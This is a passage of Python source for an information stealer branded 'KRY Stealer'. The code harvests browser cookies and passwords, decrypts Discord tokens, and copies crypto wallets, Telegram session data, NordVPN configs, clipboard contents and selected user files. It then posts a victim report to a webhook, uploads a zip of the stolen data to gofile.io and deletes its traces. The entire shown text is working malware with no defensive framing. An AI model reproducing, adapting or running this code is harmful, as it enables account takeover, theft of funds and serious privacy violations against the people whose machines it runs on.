            if profile.endswith('.default') or profile.endswith('.default-release'):

                profile_path = os.path.join(firefox_path, profile)

                if os.path.exists(os.path.join(profile_path, "cookies.sqlite")):

                    shutil.copy(os.path.join(profile_path, "cookies.sqlite"), os.path.join(profile_path, "cookies-copy.sqlite"))
                    connection = sqlite3.connect(os.path.join(profile_path, "cookies-copy.sqlite"))
                    cursor = connection.cursor()

                    cursor.execute("SELECT host, name, value FROM moz_cookies")

                    cookie_str = ""
                    for row in cursor.fetchall():
                        host, name, value = row
                        cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
                        COOKIECOUNT = COOKIECOUNT+1
                    COOKIES.append({"browser": "Firefox", "profile": profile, "cookies": base64.b64encode(cookie_str.encode()).decode()})
                    cursor.close()
                    connection.close()
                    os.remove(os.path.join(profile_path, "cookies-copy.sqlite"))
        except:
            continue

for wallet_file in WALLET_PATHS:
    if os.path.exists(wallet_file["path"]):
        try:
            zip_to_storage(wallet_file["name"], wallet_file["path"], STORAGE_PATH)
        except:
            pass

for discord_path in DISCORD_PATHS: # appends discord tokens into DISCORD_TOKENS var
    if not os.path.exists(discord_path["path"]): continue
    try:
        name_without_spaces = discord_path["name"].replace(" ", "")
        if "cord" in discord_path["path"]:
            if not os.path.exists(APPDATA + f"\\{name_without_spaces}\\Local State"): continue
            try:
                with open(APPDATA + f"\\{name_without_spaces}\\Local State", "r", encoding="utf-8") as f:
                    local_state = json.loads(f.read())

                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

                decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

                for file_name in os.listdir(discord_path["path"]):
                    if file_name[-3:] not in ["ldb", "log"]: continue
                    for line in [x.strip() for x in open(f'{discord_path["path"]}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):

                            token = decrypt_data(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), decryption_key)
                            token_data = validate_discord_token(token)

                            if token_data:
                                if token_data["id"] not in DISCORD_IDS:
                                    DISCORD_IDS.append(token_data["id"])
                                    username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"
                                    phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
                                    DISCORD_TOKENS.append(
                                        {"token": token, "user_id": token_data["id"], "username": username,
                                        "displayname": token_data["global_name"], "email": token_data["email"],
                                        "phone": phone_number})
                                    TOKENCOUNT = TOKENCOUNT+1
            except:
                pass
        else:
            for file_name in os.listdir(discord_path["path"]):
                if file_name[-3:] not in ["ldb", "log"]: continue
                for line in [x.strip() for x in open(f'{discord_path["path"]}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
                        token_data = validate_discord_token(token)
                        if token_data:
                            if token_data["id"] not in DISCORD_IDS:
                                DISCORD_IDS.append(token_data["id"])
                                username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"
                                phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
                                DISCORD_TOKENS.append(
                                    {"token": token, "user_id": token_data["id"], "username": username,
                                    "displayname": token_data["global_name"], "email": token_data["email"],
                                    "phone": phone_number})
                                TOKENCOUNT = TOKENCOUNT+1
    except:
        pass

# NOT WORKING ANYMORE. TOO LAZY TO DELETE. (IT MAY WORK IF TARGET DOESNT USE LATEST VERSION OF CHROMIUM)
for browser in CHROME_PATHS:
        if os.path.exists(browser["path"]):
            try:
                taskkill(browser["taskname"])
                strtcmd = f'"{browser["exepath"]}" --headless --remote-debugging-port=9222 --remote-allow-origins=* --user-data-dir="{browser["path"]}"'
                subprocess.Popen(strtcmd, creationflags=CREATE_NO_WINDOW, close_fds=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                targets = requests.get("http://localhost:9222/json").json()
                ws_url = targets[0]["webSocketDebuggerUrl"]
                ws = websocket.create_connection(ws_url)
                payload = {
                    "id": 1,
                    "method": "Network.getAllCookies"
                }
                ws.send(json.dumps(payload))
                cookie_str = ""
                for cookie in json.loads(ws.recv())["result"]["cookies"]:
                    cookie_str += f"{cookie['domain']}\tTRUE\t/\tFALSE\t13355861278849698\t{cookie['name']}\t{cookie['value']}\n"
                    COOKIECOUNT = COOKIECOUNT+1
                COOKIES.append({"browser": browser["name"], "profile": "Default", "cookies": base64.b64encode(cookie_str.encode()).decode()})
                ws.close()
                taskkill(browser["taskname"])
            except: pass

files_folder = os.path.join(STORAGE_PATH, "Files")
if not os.path.exists(files_folder):
    os.makedirs(files_folder)

for path in PATHS_TO_SEARCH:
    for root, _, files in os.walk(path):
        for file_name in files:
            for keyword in FILE_KEYWORDS:
                if keyword in file_name.lower():
                    for extension in ALLOWED_EXTENSIONS:
                        if file_name.endswith(extension):
                            try:
                                realpath = os.path.join(root, file_name)
                                if os.path.isfile(realpath):
                                    shutil.copy(realpath, files_folder)
                                else:
                                    zip_to_storage(realpath, files_folder)
                            except Exception as e:
                                pass

def telegram():
    try:
        kill_process("Telegram.exe")
    except:
        pass

    source_path = os.path.join(APPDATA, "Telegram Desktop", "tdata")
    destination_path = os.path.join(STORAGE_PATH, "Telegram Data")

    if os.path.exists(source_path):
        ignore_patterns = shutil.ignore_patterns("working", "user_data", "user_data#2", "emoji", "dumps", "tdummy", "temp")
        shutil.copytree(source_path, destination_path, dirs_exist_ok=True, ignore=ignore_patterns)
try:
    telegram()
except:
    pass

def nordvpn():
    source_path = os.path.join(LOCALAPPDATA, "NordVPN")
    destination_path = os.path.join(STORAGE_PATH, "VPN", "NordVpn")
    try:
        files = os.listdir(source_path)
    except:
        pass
        files = []

    saves = []

    for file in files:
        save_path = os.path.join(source_path, file)
        if os.path.isdir(save_path):
            if "exe" in file:
                try:
                    files_exe = os.listdir(save_path)
                    for file_exe in files_exe:
                        user_config_path = os.path.join(save_path, file_exe, "user.config")
                        if os.path.exists(user_config_path):
                            saves.append(user_config_path)
                except:
                    pass

    if saves:
        try:
            if not os.path.isdir(destination_path):
                os.mkdir(destination_path)

            for save in saves:
                try:
                    shutil.copy2(save, destination_path)
                except:
                    pass
        except:
            pass

def clipboard():
    try:
        clipboard_content = pyperclip.paste()
        file_path = os.path.join(STORAGE_PATH, "clipboard_data.txt")
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(clipboard_content)
    except Exception as e:
        pass

def get_main_counts():
    try:
        with open(os.path.join(STORAGE_PATH, "main_counts.json"), "r", encoding="utf-8") as f:
            data = json.load(f)
            return data.get("cookie_count", 0), data.get("password_count", 0)
    except:
        return 0, 0

def create_log():
    sys_info = SYSINFO
    main_cookies, main_passwords = get_main_counts()
    toplam_cookie = COOKIECOUNT + main_cookies
    toplam_password = len(PASSWORDS) + main_passwords
    embed = {
        "title": "KRY Stealer | 新的受害者",
        "color": 1651711,
        "fields": [
            {"name": "<:globe:1343289103801647249> IP Address", "value": sys_info["ip"]},
            {"name": "<:os:1343287136203575327> Platform", "value": sys_info["platform"], "inline": True},
            {"name": "<:winn:1343302234917568612> Hostname", "value": sys_info["hostname"], "inline": True},
            {"name": "<:cpuu:1343294375282737193> CPU", "value": sys_info["cpu"], "inline": True},
            {"name": "<:ramm:1343295668017692873> RAM (GB)", "value": str(sys_info["ram"]), "inline": True},
            {"name": "<:disc:1343287134571855913> Disk Space (GB)", "value": str(sys_info["disk"]), "inline": True},
            {"name": "<:mann:1343280335160610947> User", "value": sys_info["user"], "inline": True},
            {"name": "<:keyy:1343298302837526528> Password Count", "value": str(toplam_password), "inline": True},
            {"name": "🍪 Cookie Count", "value": str(toplam_cookie), "inline": True},
            {"name": "<:lockk:1343280340994887854> Discord Token Count", "value": str(len(DISCORD_TOKENS)), "inline": True},
            {"name": "<:folder:1343287147062362172> Files", "value": "\n".join(FILES) if FILES else "None", "inline": False},
        ]
    }
    
    payload = {
        "embeds": [embed],
        "content": "@everyone",
        "avatar_url": "https://cdn.discordapp.com/attachments/1408813846013149314/1441806217281409116/asd23.jpg?ex=6923222d&is=6921d0ad&hm=51ade4992b8464086648fb8449bae794831a045c18d9df0e7ddc2768d942193f&"
    }
    headers = {"Content-Type": "application/json"}

    try:
        r = requests.post(MAIN_URL, json=payload, headers=headers)
        if r.status_code == 200:
            return r.json().get("log_uuid", "")
    except:
        pass
    return ""

def upload(file_path: str) -> str:

    server_res = requests.get("https://api.gofile.io/servers").json()
    server = server_res["data"]["servers"][0]["name"]

    with open(file_path, "rb") as f:
        files = {"file": f}
        upload_res = requests.post(f"https://{server}.gofile.io/uploadFile", files=files).json()
    
    if upload_res["status"] == "ok":
        return upload_res["data"]["downloadPage"]
    else:
        raise Exception("File upload failed: " + upload_res.get("message", "Unknown error"))


def upload_data(L):
    information_folder = os.path.join(STORAGE_PATH, "Browsers")

    os.makedirs(information_folder, exist_ok=True)
    
    for cookie in COOKIES:
        browser_folder = os.path.join(information_folder, cookie["browser"])
        if not os.path.exists(browser_folder):
            os.makedirs(browser_folder)
        
        cookie_file_path = os.path.join(browser_folder, "cookies.txt")
        with open(cookie_file_path, "a", errors='ignore') as cookie_file:
            decoded_cookie = base64.b64decode(cookie["cookies"]).decode('utf-8', errors='ignore')
            cookie_file.write(decoded_cookie + "\n")
    
    for password in PASSWORDS:
        browser_folder = os.path.join(information_folder, password["browser"])
        if not os.path.exists(browser_folder):
            os.makedirs(browser_folder)
        
        password_file_path = os.path.join(browser_folder, "passwords.txt")
        with open(password_file_path, "a", errors='ignore') as password_file:
            password_file.write(f"URL: {password['url']}\n")
            password_file.write(f"Username: {password['username']}\n")
            password_file.write(f"Password: {password['password']}\n")
            password_file.write("\n")
    
    discord_folder = os.path.join(information_folder, "discord")
    if not os.path.exists(discord_folder):
        os.makedirs(discord_folder)

    discord_file_path = os.path.join(discord_folder, "discord_tokens.json")
    with open(discord_file_path, "a", errors='ignore') as discord_file:
        for token in DISCORD_TOKENS:
            json.dump(token, discord_file, indent=4)
            discord_file.write("\n")

    return "Data saved successfully"



    
def upload_files(filepath, loguuid):
    print(filepath, loguuid)
    try:
        gofile_url = upload(filepath)
        if not gofile_url:
            print("Failed to get Gofile URL")
            return
        
        embed = {
            "title": "File Uploaded",
            "description": f"Log File Upload - Trace ID: {loguuid}\n[Download Here]({gofile_url})",
            "color": 1651711,
            "thumbnail": {
                "url": "https://cdn.discordapp.com/attachments/1343280507835912325/1348286089286258770/circle.png?ex=67dd6945&is=67dc17c5&hm=38d8e8369958760815bd051f71241134ebd51d953cf3db3e114ddb8a0b178a6e&"
            }
        }
        
        payload = {
            "embeds": [embed],
            "avatar_url": "https://cdn.discordapp.com/attachments/1408813846013149314/1441806217281409116/asd23.jpg?ex=6923222d&is=6921d0ad&hm=51ade4992b8464086648fb8449bae794831a045c18d9df0e7ddc2768d942193f&"
        }
        
        headers = {"Content-Type": "application/json"}
        requests.post(MAIN_URL, json=payload, headers=headers)
    except Exception as e:
        print(f"Error uploading file: {e}")

for file_to_upload in os.listdir(STORAGE_PATH):
    FILES.append(file_to_upload)

def create_zip(storage_path, zip_name):
    zip_path = os.path.join(storage_path, zip_name)
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(storage_path):
            for file in files:
                file_path = os.path.join(root, file)
                
                if file_path == zip_path:
                    continue
                
                zipf.write(file_path, os.path.relpath(file_path, storage_path))
    
    return zip_path

try:

    loguuid = create_log()
    if DISCORD_TOKENS:
        for DISCORD_TOKEN in DISCORD_TOKENS:
            get_discord_user_info(DISCORD_TOKEN["token"])
    get_steam_and_epic(STORAGE_PATH+"\\Game Sessions")
    get_screenshot(STORAGE_PATH)
    upload_data(loguuid)
    zip_file_path = create_zip(STORAGE_PATH, f"{SYSINFO['hostname']}.zip")

    upload_files(zip_file_path, loguuid)
except Exception as e:
    print(f"Error: {e}")

try:
    print("exit!")    
except: pass

try:
    shutil.rmtree(STORAGE_PATH)
except:pass
